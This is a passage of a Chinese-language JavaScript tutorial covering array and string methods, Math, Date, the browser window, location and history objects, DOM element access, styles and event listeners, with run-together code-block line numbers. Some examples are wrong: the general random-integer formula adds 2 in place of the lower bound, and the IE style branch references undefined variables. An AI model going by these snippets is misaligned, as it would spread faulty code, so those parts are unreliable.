arr8.splice(2,0,8,9);console.log(ret8)//[]console.log(arr8);//[1, 2, 8, 9, 3, 4, 5]//splice删除方式ret8 = arr8.splice(3,2);console.log(ret8)//[9,3]console.log(arr8); //[1, 2, 8, 4, 5]/* 9、concat()功能: 将两个数组拼接参数: 一个或者多个数组返回值: 新数组，数组元素是所有拼接的数组元素。注意: 对原数组没有影响*/var arr9 = [1,2,3,4];var str9 = [8,9]var acp9 = [0,6,8];var ret9 = arr9.concat(str9,acp9);console.log(arr9);console.log(str9);//[8,9]console.log(acp9);//[0,6,8]console.log(ret9);//1, 2, 3, 4, 8, 9, 0, 6, 8]/*10、 indexOf()功能: 从数组的头部查找数组的元素，找到返回数组元素的下标，否则话返回-1.参数: 要查找的元素返回值: 下标或者-1*/var arr10 = [1,2,3,3,5];var ret10 = arr10.indexOf(3);console.log(arr10);//[1, 2, 3, 3, 5]console.log(ret10);// 2 从头部开始查找/* 11、lastIndexOf()功能: 从数组的尾部查找数组的元素，找到返回数组的元素下标，否则返回-1参数: 要查找的元素返回值: 下标或者-1*/var arr11 = [1,2,3,3,5];var ret11 = arr11.lastIndexOf(3);console.log(arr11);//[1, 2, 3, 3, 5]console.log(ret11); //3 下标是3，从尾数开始查找 //sot()排序//注意: 默认排序结果为升序var arr1 = [4,2,5,1,3];arr1.sort();console.log(arr1);//改变sort()排序标准var arr2 = [4,2,5,1,3];arr2.sort(compare); //调用自定义的函数当参数传入function compare(v1, v2) { // &lt;改为&gt;小于就是升序了 if (v1 &lt; v2){ return 1; } return -1;}console.log(arr2);//字符串的类型var str1 = &quot;yichen is a good man&quot;var str2 = new String(&quot;yichen is a nice man&quot;)console.log(str1)console.log(str2);console.log(typeof(str1))console.log(typeof(str2))console.log(str1.length)console.log(str2.length)//字符串的常用方法// 1、charAt(index)//获取指定下标的字符，下标从0开始var str1 = &quot;yichen尘 is a good man&quot;;console.log(str1.charAt(2)); //cconsole.log(str1.charAt(6)); //尘/* 2、charCodeAt(index)获取指定下标的字符的ASCII码(Unicode)返回值为0~65535之间的整数*/var str2 = &quot;yichen尘 is a good man逸&quot;;console.log(str2.charCodeAt(2));console.log(str2.charCodeAt(6));//23576console.log(str2.charCodeAt(21));//36920/*3、String.fromCharCode(ASCII码)将ASCII码转换成对应的字符*/var str3 = String.fromCharCode(36920);console.log(str3);//逸var str4 = String.fromCharCode(66666666);console.log(str4);//䂪//对象方法(示例方法) 对象名.XXX()//类方法(静态方法) 引用类名.XXX()/*4、字符串大小写转换，返回转换后的结果字符串*/var str4 = &quot;YICHEN is a GooD Man!&quot;;//将字符串中所有的大写字符转换成小写字符，小写字符不变var ret4_1 =str4.toLowerCase();//将字符串中所有的小写字符串转换成大写字符，大写字符保持不变var ret4_2 = str4.toUpperCase();//不会改变字符串本身，以返回值的形式返回结果console.log(&quot;str4 = &quot; + str4);console.log(&quot;ret_1 = &quot; + ret4_1);console.log(&quot;ret4_2 = &quot; + ret4_2);/*5、判断是否相等 == 值相等 === 绝对相等(值和类型都相等)10 == &quot;10&quot; true10 === &quot;10&quot; false*//*6、字符串比较大小规则: 从左至右依次对比相同下标处的字符，当两个字符不相等时，哪个字符的ASCII值大，那么字符串就大返回值为1，左边大于右边，返回值为-1，右边大于左边。返回值为0则相等*/var str6_1 = &quot;za&quot;;var str6_2 = &quot;gbc&quot;;var flag6 = str6_1.localeCompare(str6_2);console.log(&quot;flag6 = &quot; + flag6);//1if (flag6 &gt; 0){ console.log(&quot;str_1 &gt; str6_2&quot;);} else if (flag6 &lt; 0 ){ console.log(&quot;str6_1 &lt; str6_2&quot;) } else { console.log(&quot;str6_1 = str6_2&quot;)}//汉字比较大小//Unicodestr6_1 = &quot;逸尘&quot;str6_2 = &quot;很酷&quot;console.log(str6_1 &lt; str6_2);//falseconsole.log(str6_1 &gt; str6_2);//ture//7、查找字符串var str7 = &quot;yichen is a good man! yichen is a nice man&quot;;//正向查找 //返回第一次出现字符串的首下标var ret7_1 = str7.indexOf(&quot;yichen&quot;);console.log(&quot;ret7_1 = &quot; + ret7_1);//0//反向查找//返回第一次出现字符串的首下标var ret7_2 = str7.lastIndexOf(&quot;yichen&quot;);console.log(&quot;ret7_2 = &quot; + ret7_2);//22/*8、替换字符串replace(被替换的子串 , 新子串)注意: 此时只能替换第一次出现的子串，如果想全替换需要正则*/var str8 = &quot;yichen is a good man!&quot;;var ret8 = str8.replace(&quot;good&quot;, &quot;niceya&quot;);console.log(&quot;str8 = &quot; +str8);console.log(&quot;ret8 = &quot; + ret8);/*9、提取子串*/var str9 = &quot;yichen is a good good man!&quot;//从指定的下标截取到字符串结束，返回新字符串，新字符串是由被截取到的字符组成console.log(str9.substring(3));//hen is a good good man!//从参数1下标处开始截取到参数2下标之前(注意不包含参数2下标出的字符)console.log(str9.substring(3,9));//hen is//从指定的下标截取到字符串结束。返回新字符串，新字符串是由被截取到的字符组成console.log(str9.substr(3));//从参数1下标开始截取参数2长度的字符串console.log(str9.substr(3, 9));//hen is a //10、字符串分割,var str10 = &quot;yichen is a good man&quot;;var arr10 = str10.split(' ');//一空格进行分割，生成新的列表console.log(arr10); // [&quot;yichen&quot;, &quot;is&quot;, &quot;a&quot;, &quot;good&quot;, &quot;man&quot;]//把列表组合起来，console.log(arr10.join(&quot;+&quot;));//yichen+is+a+good+manconsole.log(arr10.join(&quot;==&quot;));//yichen==is==a==good==man//Math对象//四舍五入console.log(Math.round(3.6));//4//向上取整console.log(Math.ceil(3.1));//4//向下取整console.log(Math.floor(3.9));//3//取最大值console.log(Math.max(1,2,3,4,5));//5//取最小值console.log(Math.min(1,2,3,4,5));//1//取绝对值console.log(Math.abs(-3.4));//3.4//求x的y次方(x = 2 , y = 3)console.log(Math.pow(2,3));//8//开平方console.log(Math.sqrt(25));//5//随机输出x~y之间的一个整数(包含x和y) 6~2之间console.log(parseInt(Math.random()* (6 - 2 + 1) + 2));//公式 parseInt(Math.random() * (y - x + 1) + 2)//输出100~0之间console.log(parseInt(Math.random()* (100 - 0 + 1) + 0)); 二、Javascript基础提升1,Date1，Date对象1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950//Date/*ECMAScript中的Date类型是在早期Java中的java.util.Date类型的基础上构建的,为此Date类型使用自UTC1970年1月1日午夜(零时)开始经过毫秒数保存时间的。该Date类型保存的日期能够精确到1970年1月1日之前和之后的285616年*///创建/*1、直接用Date()函数返回当前时间注意: 无论Date()是否带参数，返回的都是当前时间*/var date1 = Date(&quot;2019-03-01&quot;);console.log(typeof date1);//String类型console.log(date1);//显示当前时间/*2、构造函数法--不传参数返回当前时间*/var date2 = new Date();console.log(typeof date2);//Object类型console.log(date2);/*3、构造函数法--参数是一个表示时间的字符串3.1、格式: month day, year hours:minutes:secondsFebruary 26, 2019 12:04:13注意: 如果省略了小时、分钟、秒数，这些会被设置为03.2、2019-02-26 18:32:32 2019-2-26 18:32:32 3.3、2019/02/26 18:32:32*/var date3_1 = new Date(&quot;2019/02/26&quot;);console.log(date3_1);//Tue Feb 26 2019 00:00:00 GMT+0800 (中国标准时间)var date3_2 = new Date(&quot;2019-02-26&quot;);console.log(date3_2);//Tue Feb 26 2019 08:00:00 GMT+0800 (中国标准时间)var date3_3 =new Date(&quot;2019-3-1&quot;);console.log(date3_3);//Fri Mar 01 2019 00:00:00 GMT+0800 (中国标准时间)/*4、构造函数法--参数是(年，月，日，时，分，秒，毫秒)注意: 年和月必须写，日 月从0开始，日期从1开始*/var date4 = new Date(2019,02,01,10,20,66); //2019年3月console.log(date4);//Fri Mar 01 2019 10:21:06 GMT+0800 (中国标准时间)/*5、构造函数法--参数是毫秒数返回中国标准时间*/var date5 = new Date(1000); //1秒console.log(date5);//Thu Jan 01 1970 08:00:01 GMT+0800 (中国标准时间) 2, Date对象的方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374// Date对象的方法var date = new Date();//获取年份console.log(date.getFullYear());//2020//获取月份。注意0表示1月，依次类推console.log(date.getMonth());//4 表示5月//获取日期console.log(date.getDate());//29 29号//获取星期console.log(date.getDay());//5 星期5//获取小时console.log(date.getHours());//5 表示5点//获取分钟console.log(date.getMinutes());//9 9分//获取秒数console.log(date.getSeconds());//19 19秒//设置年份date.setFullYear(2019)//设置月份//注意:传入的月份大于11，则年份增加date.setMonth(2);console.log(&quot;设置的月份是3月: &quot; + date);//设置日期//注意: 如果传入的日期超过了该月应有的天数则会增加月份date.setDate(01)console.log(&quot;设置的时间是3月01号: &quot; + date);//注意:星期 一般不用设置//设置小时//注意: 如果传入的值超过23则增加日期date.setHours(13);//设置分钟//注意:传入的值超过了59则增加小时数date.setMinutes(56);//设置秒数//注意:传入的值超过了59则增加分钟数date.setSeconds(10);//设置毫秒数//传入的值超过了999则增加秒数date.setMilliseconds(888); //设置距离1970-01-01的毫秒数//date.setTime(1551398400000);console.log(date);//转换成字符串//包含年月日时分秒console.log(date.toLocaleString())//包含年月日console.log(date.toLocaleDateString());//包含时分秒console.log(date.toLocaleTimeString());//Date.parse(dateString)//参数: 日期字符串 格式: 2019-03-01 2019/03/01 12:00:00//返回改日期距离1970年1月1日0点的毫秒数console.log(Date.parse(&quot;2019-03-01&quot;)); 3,Date对象间的运算12345678//日期运算var date1 = new Date()var date2 = new Date(2019,03,01)console.log( date1 - date2);//36654494525 得到的毫秒数console.log((date1 -date2) / 86400000) //得到距今多少天 2，BOM(浏览器对象模块)0，BOM介绍和对象属性Window 对象表示浏览器中打开的窗口。 如果文档包含框架（&lt;frame&gt; 或 &lt;iframe&gt; 标签），浏览器会为 HTML 文档创建一个 window 对象，并为每个框架创建一个额外的 window 对象。 注意： 没有应用于 window 对象的公开标准，不过所有浏览器都支持该对象 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990//BOM简介/*BOM: 浏览器对象模型(Browser Object Model),是一个用于访问浏览器和计算机屏幕的对象集合。我们可以通过全局对象window来访问这些对象。*/console.log(window.document);console.log(window.frames);console.log(window.navigator);console.log(window.screen);console.log(window.location);console.log(window.history);//window.document /* 是一个BOM对象，表示的是当前所载入的文档(即页面)，但是它的方法和属性同时也是属于DOM对象所覆盖的范围。*//*window.frames是当前页面中所有框架的集合*//*window.navigator用来反应浏览器及其功能信息的对象*//*window.screen提供浏览器以外的环境信息*//*window.locationhref属性 控制浏览器地址栏的内容reload() 刷新页面 reload(true) 刷新页面，不带缓存 assign() 加载新的页面 可以前后回去之前的页面replace() 加载新的页面(注意: 不会再浏览器的历史记录表中留下记录)*/function func() { //alert(&quot;点我干啥?&quot;); window.location.href =&quot;greenWindow.html&quot;; }function red() { window.location.href = &quot;red.html&quot;; // window.location.reload(true);}function refresh(){ window.location.reload();}function ass() { //window.location.assign(&quot;greenWindow.html&quot;); //window.location.replase(&quot;greenWindow.html&quot;); window.location.assign(&quot;https://yichenxiu.com&quot;); }/*window.historywindow.history.length 获取历史记录的长度back() 上一页forward() 下一页go(num) num&lt;0时，跳转到自己后方的第num个记录 num&gt;0时，跳转自己前方的第num个记录*/console.log(&quot;window.history.length = &quot; + window.history.length);//上一页function backPage() { window.history.back()}//下一页function forwardPage() { window.history.forward();}//go function goPage() { window.history.go() ;} Window 对象属性 属性 描述 closed 返回窗口是否已被关闭。 defaultStatus 设置或返回窗口状态栏中的默认文本。 document 对 Document 对象的只读引用。(请参阅对象) frames 返回窗口中所有命名的框架。该集合是 Window 对象的数组，每个 Window 对象在窗口中含有一个框架。 history 对 History 对象的只读引用。请参数 History 对象。 innerHeight 返回窗口的文档显示区的高度。 innerWidth 返回窗口的文档显示区的宽度。 localStorage 在浏览器中存储 key/value 对。没有过期时间。 length 设置或返回窗口中的框架数量。 location 用于窗口或框架的 Location 对象。请参阅 Location 对象。 name 设置或返回窗口的名称。 navigator 对 Navigator 对象的只读引用。请参数 Navigator 对象。 opener 返回对创建此窗口的窗口的引用。 outerHeight 返回窗口的外部高度，包含工具条与滚动条。 outerWidth 返回窗口的外部宽度，包含工具条与滚动条。 pageXOffset 设置或返回当前页面相对于窗口显示区左上角的 X 位置。 pageYOffset 设置或返回当前页面相对于窗口显示区左上角的 Y 位置。 parent 返回父窗口。 screen 对 Screen 对象的只读引用。请参数 Screen 对象。 screenLeft 返回相对于屏幕窗口的x坐标 screenTop 返回相对于屏幕窗口的y坐标 screenX 返回相对于屏幕窗口的x坐标 sessionStorage 在浏览器中存储 key/value 对。 在关闭窗口或标签页之后将会删除这些数据。 screenY 返回相对于屏幕窗口的y坐标 self 返回对当前窗口的引用。等价于 Window 属性。 status 设置窗口状态栏的文本。 top 返回最顶层的父窗口。 1，window中常用的方法1234567891011121314151617181920212223&lt;!-- window中常用的方法 --&gt; &lt;button onclick=&quot;openNewWindow()&quot;&gt;打开新窗口&lt;/button&gt; &lt;button onclick=&quot;closeWindow()&quot;&gt;关闭窗口&lt;/button&gt; &lt;script type=&quot;text/javascript&quot;&gt; function openNewWindow(){ //open(url,target,&quot;特性的字符串&quot;) window.open(&quot;yellow.html&quot;, &quot;blank&quot;,&quot;width=200px,height=400px,top = 0px ,left=0px&quot; ); } function closeWindow() { window.close(); //火狐 //about:config //我会保证小心 //allow_src //true } &lt;/script&gt; Window 对象方法 方法 描述 alert() 显示带有一段消息和一个确认按钮的警告框。 atob() 解码一个 base-64 编码的字符串。 btoa() 创建一个 base-64 编码的字符串。 blur() 把键盘焦点从顶层窗口移开。 clearInterval() 取消由 setInterval() 设置的 timeout。 clearTimeout() 取消由 setTimeout() 方法设置的 timeout。 close() 关闭浏览器窗口。 confirm() 显示带有一段消息以及确认按钮和取消按钮的对话框。 createPopup() 创建一个 pop-up 窗口。 focus() 把键盘焦点给予一个窗口。 getSelection() 返回一个 Selection 对象，表示用户选择的文本范围或光标的当前位置。 getComputedStyle() 获取指定元素的 CSS 样式。 matchMedia() 该方法用来检查 media query 语句，它返回一个 MediaQueryList对象。 moveBy() 可相对窗口的当前坐标把它移动指定的像素。 moveTo() 把窗口的左上角移动到一个指定的坐标。 open() 打开一个新的浏览器窗口或查找一个已命名的窗口。 print() 打印当前窗口的内容。 prompt() 显示可提示用户输入的对话框。 resizeBy() 按照指定的像素调整窗口的大小。 resizeTo() 把窗口的大小调整到指定的宽度和高度。 scroll() 已废弃。 该方法已经使用了 scrollTo() 方法来替代。 scrollBy() 按照指定的像素值来滚动内容。 scrollTo() 把内容滚动到指定的坐标。 setInterval() 按照指定的周期（以毫秒计）来调用函数或计算表达式。 setTimeout() 在指定的毫秒数后调用函数或计算表达式。 stop() 停止页面载入。 2，window中事件对象123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/当页面完全加载成功触发该事件 window.onload = function() { alert(&quot;页面已经加载完成，你还瞅啥&quot;) } alert(&quot;你瞅啥?&quot;) &lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onscroll = function() { var a = document.documentElement.scrollTop || document.body.scrollTop console.log(a) if (a &gt;= 500) { //加载新的数据 console.log(&quot;加载新的数据&quot;) } } &lt;/script&gt; &lt;!-- 滚动事件 --&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onresize = function() { w = document.documentElement.clientWidth || document.body.clientWidth|| window.innerWidth h = document.documentElement.clientHeight || document.body.clientHeight|| window.innerHeight console.log(w,h) } &lt;/script&gt; &lt;!-- 定时事件 --&gt; &lt;script type=&quot;text/javascript&quot;&gt; var time = window.setInterval(function(){ console.log(&quot;yichen is a good man&quot;) },2000) //2秒执行 function func1(){ //清除定时器 window.clearInterval(time) } //延时定时器 //window可以不用写，在script里面 var time1= setTimeout(function(){ console.log(&quot;yiche is a nice man&quot;) },3000) &lt;/script&gt; &lt;button type=&quot;button&quot; onclick=&quot;func1()&quot;&gt;清除定时器&lt;/button&gt; 3，DOM(文档对象模块)HTML DOM 节点在 HTML DOM (Document Object Model) 中 , 每一个元素都是 节点: 文档是一个文档节点。 所有的HTML元素(标签)都是元素节点。 所有 HTML 属性都是属性节点。 文本插入到 HTML 元素是文本节点。are text nodes。 注释是注释节点。 Document 对象当浏览器载入 HTML 文档, 它就会成为 Document 对象。 Document 对象是 HTML 文档的根节点。 Document 对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问。 提示：Document 对象是 Window 对象的一部分，可通过 window.document 属性对其进行访问。 123Core DOM 核心DOM 针对任何结果话文档的标准模型XML DOM 针对 XML 文档的标准模型HTML DOM 针对 HTML 文档的标准模型 DOM节点层级关系(DOM树)12345678910111213141516171、父节点(parent node) 父节点拥有任意数量的子节点2、子节点(child node): 子节点只能拥有一个父节点3、兄弟节点(sibling node): 拥有相同父节点的同级节点4、根节点(root node): 一个HTML文档一般只有一个根节点，根节点没有父亲节点，是最上层的节点，根节点没有父亲节点，是最上层的节点。祖先节点: 包含子节点的节点都可以叫做祖先节点，其中包括了父节点。后代节点: 一个节点内包含的所有节点，叫做后代节点，其中包括了子节点。js跟页面中的这些标签进行交互1、获取标签(元素)节点 修改标签CSS样式 修改标签属性2、创建标签3、删除标签4、复制标签5、插入标签 HTML文档中可以使用以下属性和方法: 属性 / 方法 描述 document.activeElement 返回当前获取焦点元素 document.addEventListener() 向文档添加句柄 document.adoptNode(node) 从另外一个文档返回 adapded 节点到当前文档。 document.anchors 返回对文档中所有 Anchor 对象的引用。 document.applets 返回对文档中所有 Applet 对象的引用。注意: HTML5 已不支持 元素。 document.baseURI 返回文档的绝对基础 URI document.body 返回文档的body元素 document.close() 关闭用 document.open() 方法打开的输出流，并显示选定的数据。 document.cookie 设置或返回与当前文档有关的所有 cookie。 document.createAttribute() 创建一个属性节点 document.createComment() createComment() 方法可创建注释节点。 document.createDocumentFragment() 创建空的 DocumentFragment 对象，并返回此对象。 document.createElement() 创建元素节点。 document.createTextNode() 创建文本节点。 document.doctype 返回与文档相关的文档类型声明 (DTD)。 document.documentElement 返回文档的根节点 document.documentMode 返回用于通过浏览器渲染文档的模式 document.documentURI 设置或返回文档的位置 document.domain 返回当前文档的域名。 document.domConfig 已废弃。返回 normalizeDocument() 被调用时所使用的配置。 document.embeds 返回文档中所有嵌入的内容（embed）集合 document.forms 返回对文档中所有 Form 对象引用。 document.getElementsByClassName() 返回文档中所有指定类名的元素集合，作为 NodeList 对象。 document.getElementById() 返回对拥有指定 id 的第一个对象的引用。 document.getElementsByName() 返回带有指定名称的对象集合。 document.getElementsByTagName() 返回带有指定标签名的对象集合。 document.images 返回对文档中所有 Image 对象引用。 document.implementation 返回处理该文档的 DOMImplementation 对象。 document.importNode() 把一个节点从另一个文档复制到该文档以便应用。 document.inputEncoding 返回用于文档的编码方式（在解析时）。 document.lastModified 返回文档被最后修改的日期和时间。 document.links 返回对文档中所有 Area 和 Link 对象引用。 document.normalize() 删除空文本节点，并连接相邻节点 document.normalizeDocument() 删除空文本节点，并连接相邻节点的 document.open() 打开一个流，以收集来自任何 document.write() 或 document.writeln() 方法的输出。 document.querySelector() 返回文档中匹配指定的CSS选择器的第一元素 document.querySelectorAll() document.querySelectorAll() 是 HTML5中引入的新方法，返回文档中匹配的CSS选择器的所有元素节点列表 document.readyState 返回文档状态 (载入中……) document.referrer 返回载入当前文档的文档的 URL。 document.removeEventListener() 移除文档中的事件句柄(由 addEventListener() 方法添加) document.renameNode() 重命名元素或者属性节点。 document.scripts 返回页面中所有脚本的集合。 document.strictErrorChecking 设置或返回是否强制进行错误检查。 document.title 返回当前文档的标题。 document.URL 返回文档完整的URL document.write() 向文档写 HTML 表达式 或 JavaScript 代码。 document.writeln() 等同于 write() 方法，不同的是在每个表达式之后写一个换行符。 1，获取要操作的对象1234567891011121314151617181920212223242526272829303132333435&lt;body&gt; &lt;div id=&quot;idDiv&quot;&gt;&lt;/div&gt; &lt;div class=&quot;classDiv&quot;&gt;yichen is a good nan &lt;/div&gt; &lt;div class=&quot;classDiv&quot;&gt;&lt;/div&gt; &lt;div class=&quot;classDiv&quot;&gt;&lt;/div&gt; &lt;div class=&quot;classDiv&quot;&gt;&lt;/div&gt; &lt;input type=&quot;text&quot; name=&quot;inputText&quot; /&gt; &lt;input type=&quot;text&quot; name=&quot;inputText&quot; /&gt; &lt;input type=&quot;text&quot; name=&quot;inputText&quot; /&gt; &lt;script type=&quot;text/javascript&quot;&gt; //找到要操作的标签对象 var jsDiv = document.getElementById(&quot;idDiv&quot;) console.log(jsDiv); console.log(typeof jsDiv); //通过class名获取 var jsDivs = document.getElementsByClassName(&quot;classDiv&quot;) console.log(jsDivs) console.log(typeof jsDivs) //返回带有指定名称的对象集合。 var jsInpsArr = document.getElementsByName(&quot;inputText&quot;) console.log(jsInpsArr) console.log(typeof jsInpsArr) // 返回带有指定标签名的对象集合。 var inputtag = document.getElementsByTagName(&quot;input&quot;) console.log(inputtag) console.log(typeof inputtag) &lt;/script&gt; HTML 文档对象可以避免使用这些节点对象和属性： 属性 / 方法 避免的原因 document.attributes 文档没有该属性 document.hasAttributes() 文档没有该属性 document.nextSibling 文档没有下一节点 document.nodeName 这个通常是 #document document.nodeType 这个通常是 9(DOCUMENT_NODE) document.nodeValue 文档没有一个节点值 document.ownerDocument 文档没有主文档 document.ownerElement 文档没有自己的节点 document.parentNode 文档没有父节点 document.previousSibling 文档没有兄弟节点 document.textContent 文档没有文本节点 2,获取属性节点123456789101112131415161718192021222324252627282930313233343536373839404142&lt;input type= &quot;text&quot; id =&quot;in&quot; placeholder=&quot;请留下你的大名!&quot; my=&quot;我的&quot; /&gt; &lt;button type=&quot;button&quot; onclick=&quot;func1()&quot;&gt;变身&lt;/button&gt; &lt;script type=&quot;text/javascript&quot;&gt; var jsInput = document.getElementById(&quot;in&quot;); console.log(jsInput) //方法一 //获取官方定义的属性直接使用，元素节点.属性名 //得到元素对应的属性的属性值 var typeNode = jsInput.type; console.log(typeNode);//text var placeholderNode = jsInput.placeholder; console.log(placeholderNode);//请留下你的大名! var myNode = jsInput.my ; console.log(myNode);//undefined //alert(&quot;注意！我要变身了&quot;) //修改元素对应属性的属性值 function func1(){ jsInput.placeholder = &quot;傻不傻&quot;; } /*方法二: 元素节点.getAttribute(&quot;属性名&quot;) 得到元素对应属性的属性值 注意，该方法还可以获取自定义属性 */ var idNode = jsInput.getAttribute(&quot;my&quot;); console.log(idNode);//我的 //修改元素对应属性的属性值 //元素节点.setAttribute(&quot;属性名&quot;, &quot;新的属性值&quot;);如果属性名不存在，则定义新的属性 jsInput.setAttribute(&quot;my&quot;, &quot;yichen&quot;) console.log(jsInput); //移除元素节点对应的属性 jsInput.removeAttribute(&quot;my&quot;); console.log(jsInput); console.log(jsInput.vaule) &lt;/script&gt; 3，获取文本节点和修改文本内容1234567891011121314151617181920212223242526272829303132&lt;!-- 获取文本节点 --&gt; &lt;div id=&quot;box&quot;&gt; 我是一个盒子&lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; var jsDiv = document.getElementById(&quot;box&quot;); /*1、元素节点.innerHTML 对象的开始标签到结束标签的全部内容， 不包括本身html标签 */ var inner = jsDiv.innerHTML; console.log(inner); console.log(typeof(inner)); /*2、元素节点.outerHTML 除了包含innerHTML的全部内容外，还包含对象标签本身 */ var outer = jsDiv.outerHTML; console.log(outer); console.log(typeof(outer)); /*3、元素节点.innerText 从对象的开始标签到结束标签的全部的文本内容,获取真正的文本内容， */ var text = jsDiv.innerText; console.log(text); console.log(typeof text); //修改对应的内容 jsDiv.innerHTML = &quot;&lt;h1&gt;good&lt;/h1&gt;&quot; &lt;/script&gt; 4,行间样式和外部样式的读写123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105&lt;!-- 行间样式表的读写 --&gt; &lt;div id=&quot;box1&quot; style=&quot;width: 100px;height: 200px; background-color: red;&quot;&gt; &lt;/div&gt; &lt;button onclick= &quot;changeColor1()&quot;&gt;换颜色&lt;/button&gt; &lt;script type=&quot;text/javascript&quot;&gt; //获取元素节点 var jsDiv1 = document.getElementById(&quot;box1&quot;); //获取style属性节点 var jsDivstyle = jsDiv1.style; console.log(jsDivstyle); /*获取样式表中样式属性的属性值 style属性节点.样式属性名 元素节点.style.样式属性名 元素节点.style[&quot;样式属性名&quot;] */ function changeColor(){ //注意:backgroundColor 对应css里面的background-color jsDivstyle.backgroundColor = &quot;yellow&quot;; //rgb(123,233,100)也可以 jsDiv1.style.width= &quot;200px&quot;; var h = jsDiv1.style[&quot;height&quot;]; console.log(h); } function changeColor1(){ var r = parseInt(Math.random() * 256); var g = parseInt(Math.random()* 256); var b = parseInt(Math.random()* 256); var colorStr = &quot;rgb(&quot; + r + &quot;,&quot; + g + &quot;,&quot; + b +&quot;)&quot;; jsDiv1.style.backgroundColor = colorStr; } &lt;/script&gt; &lt;!-- 外部样式表属性修改读写 --&gt; style.css文件的内容： #box2{ background-color: blue; width: 200px; height: 300px; } #box3{ background-color: hotpink; width: 500px; height: 600px; } &lt;!-- 导入外部样式表 --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/style.css&quot;/&gt; &lt;div id =&quot;box2&quot;&gt;&lt;/div&gt; &lt;div id =&quot;box3&quot;&gt;&lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; /*获取 IE中: 元素节点.currentStyle.样式属性名 元素节点.currentStyle[&quot;样式属性名&quot;] 其他: window.getComputedStyle(元素节点,样式属性名) windos.getComputedStyle(元素节点,伪类)[&quot;样式属性名&quot;] 伪类一般写null即可 */ //获取元素的节点 var jsDiv2 = document.getElementById(&quot;box2&quot;); var jsDiv3 = document.getElementById(&quot;box3&quot;); var w2 = 0; //判断是否是IE浏览器 if (jsDiv2.currentStyle) { //IE浏览器取样式属性值的方式 w2 = isDiv2.constructor.style.width; }else { //其他浏览器获取样式属性值的方式； w2 = window.getComputedStyle(jsDiv2,null).width; } console.log(w2); var w3 = 0; if (jsDiv3.currentStyle) { //IE浏览器取样式属性值的方式 w3 = isDiv3.constructor.style.width; r3 = isDiv3.constructor.style.backgroundColor; }else { //其他浏览器获取样式属性值的方式； w3 = window.getComputedStyle(jsDiv3,null).width; r3 = window.getComputedStyle(jsDiv3,null).backgroundColor; } console.log(w3); console.log(r3); //设置样式中的属性的值 //元素节点.style.样式属性名= 样式属性值 jsDiv2.style.backgroundColor = &quot;black&quot; jsDiv3.style.backgroundColor = &quot;blue&quot;; jsDiv3.style.width = &quot;300px&quot;; &lt;/script&gt; 5，事件对象触发1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;事件对象触发&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- 事件: 就是用户或者是浏览器执行的某个动作 事件处理程序: 就是响应事件的函数，事件处理程序名字是以&quot;on&quot; 开头的 --&gt; &lt;!-- 1, 直接在html标签中给与事件处理程序同名的属性赋值js代码 --&gt; &lt;button id = &quot;btn1&quot; onclick=&quot;console.log('事件处理1')&quot;&gt;按键1&lt;/button&gt; &lt;!-- 2,给与事件处理程序同名的属性赋值一个函数调用语句 --&gt; &lt;!-- 使用HTML代码与JS代码稍微有点分离，不至于第一种那么紧密耦合 --&gt; &lt;!-- this代表的是button标签本身 --&gt; &lt;button id = &quot;btn2&quot; onclick= &quot;func2(this)&quot;&gt;按键2&lt;/button&gt; &lt;!-- 3，DOM0级事件处理程序 --&gt; &lt;!-- 这种方式也是早期的写法，但好处是可以将JA与HTML完全分离，前提是需要给HTML 元素提供一个额外的id属性(或其它能获取该元素对象的方式)--&gt; &lt;button id =&quot;btn3&quot;&gt;按键3&lt;/button&gt; &lt;!-- 4，DOM2级事件处理程序 --&gt; &lt;button id =&quot;btn4&quot;&gt;按键4&lt;/button&gt; &lt;script type=&quot;text/javascript&quot;&gt; //2 function func2(obj){ console.log(&quot;事件处理2&quot;); //obj接收的是this的值，表示的是调用该函数的标签节点 console.log(obj); console.log(this);//this----window } //3 //找到id为btn3的按键 var jsBtn3 = document.getElementById(&quot;btn3&quot;); jsBtn3.onclick = func3; function func3(){ console.log(&quot;事件处理3&quot;); console.log(this);//this--元素节点 } //移除事件处理程序 //jsBtn3.onclick = null; //4，是目前最流行的事件处理程序，各大主浏览器全部支持 var jsBtn4 = document.getElementById(&quot;btn4&quot;); //添加事件监听器 //元素节点.addEventListener(&quot;事件名&quot;,响应事件的函数,布尔值) //事件名 click mouseover mouseout focus //函数名或匿名函数 //事件流 false jsBtn4.addEventListener(&quot;click&quot;, func4,false); function func4(){ console.log(&quot;事件处理4&quot;); console.log(this);//this---元素节点 } //注意: 可以绑定多个事件，互相不影响 jsBtn4.addEventListener(&quot;click&quot;,func5,false); function func5(){ console.log(&quot;事件处理5&quot;); } //移除事件 //注意: //1, 参数与添加事件时相同 //2，添加事件时第二个参数不能是匿名函数 //jsBtn4.removeEventListener(&quot;click&quot;,func4 false); /*能否使用this，this代表的谁?? 1、在标签中使用，代表的是标签本身 2、在函数体中直接使用，代表的是window 在标签中将this作为实参传递到函数中，在函数体中使用形参代表标签 本身 3、在事件函数中使用，代表标签本身 */ /*移除事件 1、无法移除 2.也无法移除 3，元素节点.onclick = null; 4、元素节点.removeEventLinstener(&quot;事件名&quot;,响应函数,false); */ &lt;/script&gt; 1,焦点事件更多事件名及属性描述参考网址 1https://www.runoob.com/jsref/dom-obj-event.html 123456789101112131415161718 &lt;!-- 焦点事件 html标签 --&gt; &lt;input type=&quot;text&quot; name=&quot;in&quot; id=&quot;put&quot; value=&quot;&quot; /&gt;//1、焦点事件 js代码 //焦点事件:一般用于文本框上 var jsInput = document.getElementById(&quot;put&quot;); //获取焦点 jsInput.addEventListener(&quot;focus&quot;,funcFocus,false); function funcFocus(){ 